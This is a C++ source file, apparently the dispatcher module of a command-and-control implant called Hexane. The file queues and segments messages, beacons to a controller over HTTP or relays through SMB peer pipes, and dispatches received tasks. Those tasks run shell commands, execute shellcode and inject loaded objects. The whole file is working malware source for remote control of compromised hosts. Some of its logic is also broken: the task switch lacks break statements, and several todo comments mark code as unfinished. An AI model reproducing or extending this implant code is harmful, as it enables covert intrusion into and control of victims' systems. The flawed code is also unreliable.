#include <core/include/dispatch.hpp>
namespace Dispatcher {

    BOOL PeekPID(const _stream *const stream) {
        HEXANE

        uint32_t pid = 0;
        x_memcpy(&pid, stream->buffer, 4);

        if (x_memcmp(&Ctx->session.peer_id, &pid, 4) == 0) {
            return TRUE;
        }

        return FALSE;
    }

    VOID AddMessage(_stream *const out) {
        HEXANE

        _stream *head = Ctx->transport.outbound_queue;

        if (!Ctx->transport.outbound_queue) {
            Ctx->transport.outbound_queue = out;
        } else {
            while (head->next) {
                head = head->next;
            }

            head->next = out;
        }
    }

    VOID ClearQueue() {
        HEXANE

        _stream *head = Ctx->transport.outbound_queue;
        _stream *swap = { };
        _stream *prev = { };

        if (!head) {
            Ctx->transport.outbound_queue = nullptr;
            return;
        }

        while (head) {
            if (head->ready) {
                if (prev) {
                    prev->next = head->next;

                } else {
                    Ctx->transport.outbound_queue = head->next;
                }
                swap = head;
                head = head->next;

                Stream::DestroyStream(swap);

            } else {
                prev = head;
                head = head->next;
            }
        }
    }

    VOID OutboundQueue(_stream *const out) {
        HEXANE

        _parser parser = { };
        _stream *queue = { };

        if (!out) {
            return_defer(ERROR_NO_DATA);
        }

        if (out->length > MESSAGE_MAX) {
            QueueSegments(B_PTR(out->buffer), out->length);

        } else {
            Parser::CreateParser(&parser, B_PTR(out->buffer), out->length);

            queue           = Stream::CreateStream();
            queue->peer_id   = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));
            queue->task_id   = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));
            queue->msg_type  = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));

            queue->length   = parser.Length;
            queue->buffer   = x_realloc(queue->buffer, queue->length);

            x_memcpy(queue->buffer, parser.buffer, queue->length);
            AddMessage(queue);

            Parser::DestroyParser(&parser);
            Stream::DestroyStream(out);
        }

        defer:
    }

    VOID QueueSegments(uint8_t *const buffer, uint32_t length) {
        HEXANE

        _stream *queue = { };

        uint32_t offset     = 0;
        uint32_t peer_id    = 0;
        uint32_t task_id    = 0;
        uint32_t cb_seg     = 0;
        uint32_t index      = 1;

        const auto n_seg = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;

        while (length > 0) {
            cb_seg = length > MESSAGE_MAX - SEGMENT_HEADER_SIZE
                ? MESSAGE_MAX - SEGMENT_HEADER_SIZE
                : length;

            queue = S_CAST(_stream*, x_malloc(cb_seg + SEGMENT_HEADER_SIZE));

            x_memcpy(&peer_id, buffer, 4);
            x_memcpy(&task_id, buffer + 4, 4);

            queue->peer_id    = peer_id;
            queue->task_id    = task_id;
            queue->msg_type   = TypeSegment;

            Stream::PackDword(queue, index);
            Stream::PackDword(queue, n_seg);
            Stream::PackDword(queue, cb_seg);
            Stream::PackBytes(queue, B_PTR(buffer) + offset, cb_seg);

            index++;
            length -= cb_seg;
            offset += cb_seg;

            AddMessage(queue);
        }
    }

    BOOL PackageQueueItem(_stream *out) {
        HEXANE

        // todo: refactor this to work with the new queue process
        _stream *head   = Ctx->transport.outbound_queue;
        _parser parser  = { };
        bool success    = true;

        while (head) {
            if (!head->ready) {
                if (head->length + MESSAGE_HEADER_SIZE + out->length > MESSAGE_MAX) {
                    break;
                }

                if (head->buffer) {
                    Parser::CreateParser(&parser, B_PTR(head->buffer), head->length);
                    Stream::PackDword(out, head->peer_id);
                    Stream::PackDword(out, head->task_id);
                    Stream::PackDword(out, head->msg_type);

                    if (Ctx->root) {
                        Stream::PackBytes(out, B_PTR(head->buffer), head->length);

                    } else {
                        out->buffer = x_realloc(out->buffer, out->length + head->length);
                        x_memcpy(B_PTR(out->buffer) + out->length, head->buffer, head->length);

                        out->length += head->length;
                    }
                } else {
                    success = false;
                    return_defer(ERROR_INVALID_USER_BUFFER);
                }

                head->ready = true;
            }

            head = head->next;
        }

        defer:
        Parser::DestroyParser(&parser);
        return success;
    }

    VOID MessageTransmit() {
        HEXANE

        _stream *out    = Stream::CreateStream();
        _stream *in     = { };
        _stream *head   = { };
        _stream *swap   = { };

        retry:
        if (!Ctx->transport.outbound_queue) {

#if     defined(TRANSPORT_SMB)
            // todo: this will fail infinitely on smb as no new messages will be read in
            return_defer(ERROR_SUCCESS);
#elif   defined(TRANSPORT_HTTP)
            PSTREAM entry = Stream::CreateStreamWithHeaders(TypeTasking);

            OutboundQueue(entry);
            goto retry;
#endif
        } else {
            if (!PackageQueueItem(out)) {
                return_defer(ntstatus);
            }
        }

#if     defined(TRANSPORT_HTTP)
        Network::Http::HttpCallback(out, &in);
#elif   defined(TRANSPORT_PIPE)
        Network::Smb::PeerConnectEgress(out, &in);
#endif

        Stream::DestroyStream(out);
        out = nullptr;

        if (in) {
            ClearQueue(); // todo: do not clear the queue, just remove n entries that succeeded

            if (PeekPID(in)) {
                CommandDispatch(in);
                Stream::DestroyStream(in);

            } else {
                swap = in;
                in = out;
                out = swap;

                if (Ctx->peers->ingress_name) {
                    Network::Smb::PeerConnectIngress(out, &in);

                    if (in) {
                        OutboundQueue(in);
                    }
                }
                Stream::DestroyStream(out);
            }
        } else {
            head = Ctx->transport.outbound_queue;
            while (head) {
                head->ready = FALSE;
                head = head->next;
            }
        }

    defer:
    }

    VOID CommandDispatch (const _stream *const in) {
        HEXANE

        _parser parser = { };

        Parser::CreateParser(&parser, B_PTR(in->buffer), in->length);
        Parser::UnpackDword(&parser); // todo: maybe generate new pid every task?

        Ctx->session.current_taskid = Parser::UnpackDword(&parser);

        auto msg_type = Parser::UnpackDword(&parser);
        switch (msg_type) {

            case TypeCheckin:   Ctx->session.checkin = true;
            case TypeTasking:   Memory::Execute::ExecuteCommand(parser);
            case TypeExecute:   Memory::Execute::ExecuteShellcode(parser);
            case TypeObject:    Injection::LoadObject(parser);

            default:
                break;
        }

        Parser::DestroyParser(&parser);
    }
}